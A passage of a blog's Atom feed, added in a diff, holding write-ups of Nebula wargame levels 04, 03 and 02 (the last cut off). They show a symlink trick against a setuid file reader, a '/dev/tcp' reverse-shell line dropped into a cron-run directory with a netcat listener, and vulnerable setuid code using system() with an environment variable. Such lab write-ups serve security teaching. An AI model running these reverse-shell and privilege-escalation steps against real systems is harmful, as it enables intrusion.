+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unable to read fd %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;After login we go to the flag account folder.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag04/
+&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 13
+drwxr-x--- 2 flag04 level04   93 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag04 flag04   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag04 flag04  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag04 flag04   675 May 18  2011 .profile
+-rwsr-x--- 1 flag04 level04 7428 Nov 20  2011 flag04
+-rw------- 1 flag04 flag04    37 Nov 20  2011 token
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hmm, let’s get more info by trying some basic commands.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 13
+drwxr-x--- 2 flag04 level04   93 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag04 flag04   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag04 flag04  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag04 flag04   675 May 18  2011 .profile
+-rwsr-x--- 1 flag04 level04 7428 Nov 20  2011 flag04
+-rw------- 1 flag04 flag04    37 Nov 20  2011 token
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; file flag04
+&lt;span class=&quot;go&quot;&gt;flag04: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; ./flag04
+&lt;span class=&quot;go&quot;&gt;./flag04 [file to read]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;token
+&lt;span class=&quot;go&quot;&gt;cat: token: Permission denied
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; ./flag04 token
+&lt;span class=&quot;go&quot;&gt;You may not access 'token'
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Permission denied. Really? Nope. Where do we control everything as any user? Well …​ In /tmp/ folder and as we did in previous tutorials hard link are hard link!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /home/flag04/token /tmp/level04
+&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /tmp
+&lt;span class=&quot;go&quot;&gt;total 0
+drwxrwxrwt 4 root    root    100 Oct 16 13:18 .
+drwxr-xr-x 1 root    root    220 Oct 16  2017 ..
+drwxrwxrwt 2 root    root     40 Oct 16  2017 .ICE-unix
+drwxrwxrwt 2 root    root     40 Oct 16  2017 .X11-unix
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx 1 level04 level04  18 Oct 16 13:17 level04 -&amp;gt;&lt;/span&gt; /home/flag04/token
+&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That funny moment when you see the “lrwxrwxrwx” as permission for your hard link. Let’s end this.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; ./flag04 /tmp/level04
+&lt;span class=&quot;go&quot;&gt;06508b5e-8909-4f38-b630-fdb148a848a2
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now keep in mind that tokens in this exploit tutorial are used as passwords for the flag account.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level04@nebula:/home/flag04$&lt;/span&gt; su flag04
+&lt;span class=&quot;go&quot;&gt;Password:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=995(flag04) gid=995(flag04) groups=995(flag04)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;sh-4.2$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;See you in the next tutorial. Share, Like and ask!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 03</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-03/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 03" />
+      
+      <published>2018-07-16T15:48:00-03:00</published>
+      <updated>2018-07-16T15:48:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-03</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-03/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;
+
+&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;There is no source code available for this level&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Let’s jump in!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 6
+drwxr-x--- 3 flag03 level03  103 Nov 20  2011 .
+drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
+-rw-r--r-- 1 flag03 flag03   220 May 18  2011 .bash_logout
+-rw-r--r-- 1 flag03 flag03  3353 May 18  2011 .bashrc
+-rw-r--r-- 1 flag03 flag03   675 May 18  2011 .profile
+drwxrwxrwx 2 flag03 flag03     3 Aug 18  2012 writable.d
+-rwxr-xr-x 1 flag03 flag03    98 Nov 20  2011 writable.sh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interesting! Let’s get more info about the task.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;writable.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/sh
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;for i in /home/flag03/writable.d/* ;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	(ulimit -t 5;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	rm -f &quot;$&lt;/span&gt;i&lt;span class=&quot;s2&quot;&gt;&quot;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;done
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ./writable.d/
+&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03/writable.d$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 0
+drwxrwxrwx 2 flag03 flag03    3 Aug 18  2012 .
+drwxr-x--- 3 flag03 level03 103 Nov 20  2011 ..
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03/writable.d$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have been told from the beginning that there is a crontab that is called every couple of minutes. But what is a crontab?&lt;/p&gt;
+
+&lt;p&gt;Wikipedia: The software utility Cron is a time-based job scheduler in Unix-like computer operating systems. People who set up and maintain software environments use cron to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals. It typically automates system maintenance or administration—though its general-purpose nature makes it useful for things like downloading files from the Internet and downloading email at regular intervals.&lt;/p&gt;
+
+&lt;p&gt;We will assume that the crontab is executing the only script we have “writable.sh”. Let’s look again at the code:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/flag03/writable.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, simple! At line (1) we are executing a bash script and at line (2) we are removing that bash script from “/home/flag03/writable.d/*”. Fine, let’s get a shell!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;lucian@vm:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 8080
+&lt;span class=&quot;go&quot;&gt;Listening on [0.0.0.0] (family 0, port 8080
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s prepare our script.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;writable.d/
+&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03/writable.d$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.104/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.sh
+&lt;span class=&quot;gp&quot;&gt;level03@nebula:/home/flag03/writable.d$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh
+&lt;span class=&quot;gp&quot;&gt;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.0.104/8080 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done. Now we wait for like 5 minutes to in order to get the crontab execution.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;lucian@vm:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 8080
+&lt;span class=&quot;go&quot;&gt;Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [192.168.0.100] port 8080 [tcp/*] accepted (family 2, sport 45702)
+bash: no job control in this shell
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag03@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;id
+uid=996(flag03) gid=996(flag03) groups=996(flag03)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag03@nebula:~$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;getflag
+You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag03@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;See you in the next tutorial!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 02</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-02/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 02" />
+      
+      <published>2018-07-16T15:36:00-03:00</published>
+      <updated>2018-07-16T15:36:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-02</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-02/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;asprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/echo %s is cool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;USER&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;about to call system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;After login we go to the flag account folder.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag02/
+&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Flag02
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This program is almost the same as the previous one but we can not simply link “/bin/echo” to “/bin/getflag” because of the path “/bin”. But on this line:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;asprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/echo %s is cool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;USER&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can observe the “getenv” function which is making our lives easier. If you do not know what “getenv” dose then read the following: http://en.cppreference.com/w/cpp/utility/program/getenv&lt;/p&gt;
+
+&lt;p&gt;So let’s try the following export:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;getflag
+&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this moment the system variable $USER has the value of “getflag”. Let’s test:&lt;/p&gt;
+
